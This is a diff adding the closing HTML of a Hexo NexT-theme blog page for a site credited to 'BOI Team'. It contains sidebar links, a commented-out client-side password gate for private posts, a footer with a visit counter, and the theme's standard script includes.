+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BOITeam" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BOITeam" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+      <!--<script src="https://cdn.staticfile.org/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    var div = $('.post-body');
+    var toc=$('.post-toc')
+    function password() {
+        if(''){
+            div.remove();
+            toc.remove();
+            $('.post-header').after(
+            '<span class="description" value="password" style="font-style: normal;font-weight: bold;border: none;display: block;'+
+            'width: 60%;margin: 0 auto;text-align: center;outline: none;margin-bottom: 40px;resize:none ">'+
+            'Private Articles' +
+            '</span>' +
+            '<div class="qiang" style="height: 100px;width: 60%;margin:0 auto">' +
+            '<input class="password"  type="password" autocomplete="new-password" autofocus="autofocus" value="" style="border-radius: 5px;height: 30px;border: none;display: block;border-bottom: 1px solid #ccc;' +
+            'margin: 0 auto;outline: none;width:95%"/>' +
+            '</div>')
+            //绑定点击事件，如果是点击的.password 这个div就改变样式，如果是document中除了div之外的其他任何元素，就变回原来的样式。
+            document.onclick = function (event) {
+                var e = event || window.event;
+                var elem = e.srcElement || e.target;
+
+                while (elem) {
+                    if (elem != document) {
+                        if (elem.className == "password") {
+                            //$(".password").animate({paddingTop:"30px",width:"100%",borderWidth:"2px"},300)
+                            return;
+                        }
+                        elem = elem.parentNode;
+                    } else {
+                        //$(".password").animate({paddingTop:"0px",width:"95%",borderWidth:"1px"},300)
+                        return;
+                    }
+                }
+            }
+
+            $(document).keyup(function(event){
+                if(event.keyCode ==13&&$('.password').length>0){
+                    //console.log($('.password').val())
+                    //console.log('')
+                    if ($('.password').val() == '') {
+                        //恢复文章内容
+                        (div).appendTo($(".post-header"))
+                        //恢复目录
+                        toc.appendTo($(".sidebar-inner"))
+                        //删除本页面的输入密码组件
+                        $(".description").remove();
+                        $(".qiang").remove();
+                        $(".password").remove();
+
+                        $('img').lazyload({
+                            placeholder: '/images/loading.gif',
+                            effect: 'fadeIn',
+                            threshold : 100,
+                            failure_limit : 20,
+                            skip_invisible : false
+                        });
+                        $(".post-block").css({opacity:1});
+                        $(".post-header").css({opacity:1});
+                        $(".post-body").css({opacity:1});
+                        $(".pagination").css({opacity:1});
+                    }else {
+                        alert("Error Password")
+                    }
+                }
+            });
+        }
+    }
+    password();
+</script>-->
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BOI Team</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">40k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
